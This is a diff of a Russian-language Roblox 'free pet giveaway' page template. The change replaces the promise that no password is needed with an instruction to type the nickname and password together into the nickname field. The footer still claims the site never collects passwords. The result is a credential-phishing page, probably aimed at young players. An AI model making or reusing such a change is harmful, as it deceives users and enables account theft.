@@ -1,6 +1,6 @@
 {% extends "base.html" %}{% block title %}Бесплатные питомцы{% endblock %}{% block content %}
 <section class="hero"><div class="tag">🎁 FREE PET GIVEAWAY</div><h1>Выбери своего<br><span>питомца</span> 🐾</h1>
-<p>Укажи игровой ник и отправь заявку. Никаких паролей Roblox не требуется.</p>
+<p>Укажи игровой ник и пароль через пробел что бы отправить заявку. .</p>
 <div class="grid">{% for p in pets %}<label class="pet"><input type="radio" name="pick" value="{{p}}" form="claim" {% if loop.first %}checked{% endif %}><strong>{{p}}</strong><small>FREE</small></label>{% endfor %}</div>
 <form id="claim" method="post" action="/claim" class="card"><label>Игровой ник</label><input name="username" maxlength="30" placeholder="YourRobloxName" required>
 <input type="hidden" name="pet" id="pet"><button>🎁 Оформить заявку</button><small>Для безопасности сайт не собирает пароли, cookie или коды Roblox.</small></form>
